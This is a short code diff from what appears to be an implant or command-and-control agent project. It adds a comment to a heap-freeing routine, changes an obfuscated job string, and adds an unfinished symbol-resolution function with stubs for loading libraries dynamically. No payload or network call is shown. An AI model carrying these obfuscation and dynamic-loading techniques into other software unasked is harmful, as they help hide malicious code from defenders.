@@ -248,6 +248,8 @@ namespace Memory {
         }
 
         VOID ContextDestroy(_hexane* Ctx) {
+            // todo: needs expanded
+
             auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
             auto Heap = Ctx->Heap;
 
@@ -266,7 +268,7 @@ namespace Memory {
             uintptr_t address = { };
             *internal = FALSE;
 
-            if (id == OBF("null")) {
+            if (id == OBF("NoJob")) {
                 goto defer;
             }
 
@@ -283,6 +285,25 @@ namespace Memory {
 
             defer:
             return address;
+        }
+
+        UINT_PTR ResolveSymbols(const char* id, bool* internal) {
+            HEXANE
+
+            uintptr_t address = { };
+            *internal = false;
+
+            if ((address = Memory::Objects::GetInternalAddress(id, internal)) && *internal) {
+                return address;
+            } else {
+                HMODULE library = { };
+                auto copy_name  = id;
+                char *lib_name  = { };
+
+                // get library name
+                // get symbol name
+                // LoadLibraryA
+            }
         }
     }
 
